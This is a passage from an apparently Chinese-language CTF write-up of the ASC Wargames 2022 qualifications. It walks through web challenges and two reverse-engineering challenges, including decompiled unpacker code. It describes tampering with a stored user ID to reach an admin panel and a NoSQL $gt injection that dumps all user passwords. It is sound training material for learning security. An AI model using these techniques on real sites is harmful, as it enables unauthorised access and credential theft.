operator">=</span><span class="token string">'/otp/verify'</span><span class="token punctuation">;</span>firstTime<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username_label'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'hidden'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'OTP_label'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">toggle</span><span class="token punctuation">(</span><span class="token string">'appear'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'OTP'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">'text'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span>errors <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">CCas</span><span class="token punctuation">(</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">MD5</span><span class="token punctuation">(</span><span class="token string">'vverrriifiied'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">MD5</span><span class="token punctuation">(</span><span class="token string">'saxxx'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1222</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/admin'</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">&amp;&amp;</span> data<span class="token punctuation">.</span>errors <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>exists <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username_label'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'red'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username_label'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'Wrong username'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问页面即可得到最终的Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/borgOLBQxPZepYHuRwcHdA.png" alt="1-2-2"></p><h3 id="1-3-Doctor-X-Aha"><a href="#1-3-Doctor-X-Aha" class="headerlink" title="1-3 Doctor X [Aha!]"></a>1-3 <strong>Doctor X [Aha!]</strong></h3><p>Doctor X是Web题目中的第三题，当时并没有解决，所以仔细阅读了出题人的比赛后给出的<a href="https://ahmed8magdy.medium.com/asc-wargames-qualifications-2022-web-challenge-write-up-dd19cb55d5eb">WriteUp</a>来查看自己思路上的欠缺。</p><p>Doctor X网站也是一个登陆系统的网站，只不过该网站是使用Angular框架书写，导致页面的客户端源码非常不好读。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151635.png" alt="1-3-1"></p><p>通过注册和登陆后，我们可以进入到系统内部。系统内部显示了登陆用户的用户名，并且存在一个更新密码的逻辑。我一开始以为是XSS漏洞，毕竟用户名是用户可以操控的并且会回显。但是后来出题人在discord中给出线索，让我们专注于服务器端的漏洞。</p><p>因此，存在漏洞的地方应该就在更新密码的逻辑部分，如下所示。但是基于框架的客户端源码并不好读，所以我们也没有看出什么敏感的信息。</p><pre class="line-numbers language-none"><code class="language-none">function SettingsComponent_form_5_div_6_Template(rf, ctx) &#123; if (rf &amp; 1) &#123;    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](0, &quot;div&quot;, 14)(1, &quot;span&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](2, &quot;Old Password required &quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]()();&#125; &#125;function SettingsComponent_form_5_div_12_Template(rf, ctx) &#123; if (rf &amp; 1) &#123;    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](0, &quot;div&quot;, 14)(1, &quot;span&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](2, &quot;New Password required&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]()();&#125; &#125;function SettingsComponent_form_5_Template(rf, ctx) &#123; if (rf &amp; 1) &#123;    const _r6 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵgetCurrentView&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](0, &quot;form&quot;, 4)(1, &quot;div&quot;, 5)(2, &quot;label&quot;, 6);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](3, &quot;Old Password&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelement&quot;](4, &quot;input&quot;, 7, 8);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtemplate&quot;](6, SettingsComponent_form_5_div_6_Template, 3, 0, &quot;div&quot;, 9);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](7, &quot;div&quot;, 5)(8, &quot;label&quot;, 10);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](9, &quot;New Password&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelement&quot;](10, &quot;input&quot;, 11, 12);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtemplate&quot;](12, SettingsComponent_form_5_div_12_Template, 3, 0, &quot;div&quot;, 9);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementStart&quot;](13, &quot;button&quot;, 13);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵlistener&quot;](&quot;click&quot;, function SettingsComponent_form_5_Template_button_click_13_listener() &#123; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵrestoreView&quot;](_r6); const _r1 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵreference&quot;](5); const _r3 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵreference&quot;](11); const ctx_r5 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵnextContext&quot;](); return _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵresetView&quot;](ctx_r5.ChangeUserPassword(_r1.value, _r3.value)); &#125;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵtext&quot;](14, &quot;Update Password&quot;);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵelementEnd&quot;]()();&#125; if (rf &amp; 2) &#123;    const ctx_r0 &#x3D; _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵnextContext&quot;]();    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵproperty&quot;](&quot;formGroup&quot;, ctx_r0.ChangePassword);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵadvance&quot;](6);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵproperty&quot;](&quot;ngIf&quot;, (ctx_r0.ChangePassword.controls[&quot;oldpass&quot;] &#x3D;&#x3D; null ? null : ctx_r0.ChangePassword.controls[&quot;oldpass&quot;].invalid) &amp;&amp; (ctx_r0.ChangePassword.controls[&quot;oldpass&quot;].dirty || ctx_r0.ChangePassword.controls[&quot;oldpass&quot;].touched));    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵadvance&quot;](6);    _angular_core__WEBPACK_IMPORTED_MODULE_1__[&quot;ɵɵproperty&quot;](&quot;ngIf&quot;, ctx_r0.ChangePassword.controls[&quot;newpassword&quot;].invalid &amp;&amp; (ctx_r0.ChangePassword.controls[&quot;newpassword&quot;].dirty || ctx_r0.ChangePassword.controls[&quot;newpassword&quot;].touched));&#125; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从WriteUp中我看到原来还可以直接通过F12-&gt;Application-&gt;Storage查看客户端存储的Cookie或者其他信息。原来漏洞点就在这里，客户端会根据当前用户ID和用户名访问不同的页面。当修改UserID为1，即admin时，则会进入admin的系统界面。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151705.png" alt="1-3-2"></p><p>在admin的dashboard存在搜索所有用户及其密码的API。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151722.png" alt="1-3-3"></p><p>接着多输入一个}使其报错，通过报错信息查看数据库的一些基本信息。由下可以看到，数据库是nosql类型的，换句话说就是以键值对形式(json)存储的数据。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151742.png" alt="1-3-4"></p><p>根据nosql注入的技巧，详见<a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">HackTricks相关页面</a>,我们可以使用$gt来获得所有用户的信息。最终自然flag也在其中。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151807.png" alt="1-3-5"></p><h2 id="2-Reverse"><a href="#2-Reverse" class="headerlink" title="2 Reverse"></a><strong>2 Reverse</strong></h2><h3 id="2-1-Unpacking-101"><a href="#2-1-Unpacking-101" class="headerlink" title="2-1 Unpacking 101"></a><strong>2-1 Unpacking 101</strong></h3><p>首先改题目提供了一个exe程序。程序的主题逻辑，为寻找程序中隐藏的第二个程序文件的位置，将第二个exe文件的内容以Loadexe()函数的形式加载到内存当中运行。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151824.png" alt="2-1-1"></p><p>了解了这些，我们来看程序最关键的函数unpackFiles()，在这个函数中，提供了哈夫曼压缩、和简单的解密函数。初次阅读，本以为这些压缩算法和解密函数应用到解题过程中。为此，我多次修改了exe文件中指定位置存放的内容。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token keyword">if</span> <span class="token punctuation">(</span> binSignature <span class="token operator">==</span> <span class="token number">1095125318</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pdata<span class="token punctuation">,</span> <span class="token number">0x110u</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> packArchive<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Extracting >>>> %s [%li]\n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">)</span><span class="token punctuation">;</span>    size <span class="token operator">=</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">;</span>    content <span class="token operator">=</span> <span class="token punctuation">(</span>UCHAR <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fread</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> packArchive<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>packArchive<span class="token punctuation">)</span><span class="token punctuation">;</span>    keyProvided <span class="token operator">=</span> pdata<span class="token punctuation">.</span>key <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> pdata<span class="token punctuation">.</span>parameter <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDecompressing >>>> %s \n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token punctuation">(</span>HuffmanD <span class="token operator">*</span><span class="token punctuation">)</span>operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token number">0x280Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      HuffmanD<span class="token operator">::</span><span class="token function">HuffmanD</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>      huf <span class="token operator">=</span> v4<span class="token punctuation">;</span>      outsize <span class="token operator">=</span> HuffmanD<span class="token operator">::</span><span class="token function">Decompress</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> content<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">)</span><span class="token punctuation">;</span>      output <span class="token operator">=</span> HuffmanD<span class="token operator">::</span><span class="token function">getOutput</span><span class="token punctuation">(</span>huf<span class="token punctuation">)</span><span class="token punctuation">;</span>      decryptedContent <span class="token operator">=</span> output<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> pdata<span class="token punctuation">.</span>parameter <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> pdata<span class="token punctuation">.</span>parameter <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDecrypting >>>> %s \n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        decryptedContent <span class="token operator">=</span> <span class="token punctuation">(</span>UCHAR <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>keyProvided <span class="token punctuation">)</span>          decryptedContent <span class="token operator">=</span> <span class="token function">decryptFile</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          decryptedContent <span class="token operator">=</span> <span class="token function">decryptFile</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> size<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        outsize <span class="token operator">=</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> pdata<span class="token punctuation">.</span>parameter <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDecompressing >>>> %s \n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token punctuation">(</span>HuffmanD <span class="token operator">*</span><span class="token punctuation">)</span>operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token number">0x280Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HuffmanD<span class="token operator">::</span><span class="token function">HuffmanD</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>        huf <span class="token operator">=</span> v5<span class="token punctuation">;</span>        outsize <span class="token operator">=</span> HuffmanD<span class="token operator">::</span><span class="token function">Decompress</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> content<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">)</span><span class="token punctuation">;</span>        output <span class="token operator">=</span> HuffmanD<span class="token operator">::</span><span class="token function">getOutput</span><span class="token punctuation">(</span>huf<span class="token punctuation">)</span><span class="token punctuation">;</span>        decryptedContent <span class="token operator">=</span> <span class="token punctuation">(</span>UCHAR <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>outsize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDecrypting >>>> %s \n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>keyProvided <span class="token punctuation">)</span>          decryptedContent <span class="token operator">=</span> <span class="token function">decryptFile</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> outsize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          decryptedContent <span class="token operator">=</span> <span class="token function">decryptFile</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> outsize<span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>pdata<span class="token punctuation">.</span>parameter <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      outsize <span class="token operator">=</span> pdata<span class="token punctuation">.</span>filesize<span class="token punctuation">;</span>      decryptedContent <span class="token operator">=</span> content<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nUnpacking Successful!\n\nExecuting from Memory >>>> %s [%i]\n"</span><span class="token punctuation">,</span> pdata<span class="token punctuation">.</span>filename<span class="token punctuation">,</span> outsize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LoadEXE</span><span class="token punctuation">(</span>decryptedContent<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是由于fread(&amp;pdata, 0x110u, 1u, packArchive);中pada读取的结构体的parameter变量为0. 所以我们猜测，隐藏的第二个exe内容并没有进行相应的压缩或者解密的处理。而是直接可以运行，双击程序运行显示的内容也和我们的猜想一致。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151854.png" alt="2-1-2"></p><p>下图为pdata结构体读取的内容。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151917.png" alt="2-1-3"></p><p>之后的内容，也是一个exe文件的头的格式，既然运行loadexe的方式行不通，我选择先将隐藏exe文件的内容复制为新的文件，再用ida对其进行反编译。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151938.png" alt="2-1-4"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152000.png" alt="2-1-5"></p><p>发现其存在字符串对比的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">54</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v10<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_1181020</span><span class="token punctuation">(</span><span class="token string">"Wrong Flag :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">sub_1181020</span><span class="token punctuation">(</span><span class="token string">"Correct Flag :)\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们把断点打在循环开始之前，之后便在内存当中找到了flag的位置。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152024.png" alt="2-1-6"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152056.png" alt="2-1-7"></p><h3 id="2-2-PE-Anatomy"><a href="#2-2-PE-Anatomy" class="headerlink" title="2-2 PE Anatomy"></a>2-2 <strong>PE Anatomy</strong></h3><p>该题目提供了两个二进制文件，其中一个为Dont_run.bin，另一个为PE_Anatomy.exe。通过查看PE_Anatomy.exe文件的反编译代码，其主逻辑为通过读取Dont_run.bin中的特定位置的内容，并判断该位置是否符合if判断的条件，最终运行解密函数，将隐藏在其中的flag解密并显示出来。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152114.png" alt="2-2-1"></p><p>关于读取Dont_run.bin特定位置的内容，进行if语句进行判断。我们需要根据if判断语句中的数值，基于其类型word还是dword亦或者是i_64等对Dont_run.bin中特定位置的内容进行修改。</p><p>由于修改的位置很多，所以我就不一一列举了。下面是一些例子：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152133.png" alt="2-2-2"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152150.png" alt="2-2-3"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815152206.png" alt="2-2-4"></p><p>这个函数是for循环函数，这个函数不同于上面的if判断语句，可以直接修改内容。出题人绕了一个小弯，意图考察同学们对于地址知识的熟悉程度。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v35 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>lpBuffer<span class="token punctuation">[</span><span class="token number">10</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">66</span><span class="token punctuation">]</span> <span class="token operator">+</span> lpBuffer<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          v8 <span class="token operator">=</span> <span class="token string">"bbbbb"</span><span class="token punctuation">;</span>          v9 <span class="token operator">=</span> v35 <span class="token operator">-</span> <span class="token punctuation">(</span>_QWORD<span class="token punctuation">)</span><span class="token string">"bbbbb"</span><span class="token punctuation">;</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            v10 <span class="token operator">=</span> <span class="token operator">*</span>v8<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v8 <span class="token operator">!=</span> v8<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token operator">++</span>v8<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v10 <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">goto</span> LABEL_53<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>          v11 <span class="token operator">=</span> v10 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>LABEL_53<span class="token operator">:</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token punctuation">)</span>            v33 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        v4 <span class="token operator">=</span> <span class="token string">"aaaaa"</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> v35 <span class="token operator">-</span> <span class="token punctuation">(</span>_QWORD<span class="token punctuation">)</span><span class="token string">"aaaaa"</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          v6 <span class="token operator">=</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v4 <span class="token operator">!=</span> v4<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v4<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v6 <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> LABEL_44<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        v7 <span class="token operator">=</span> v6 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token 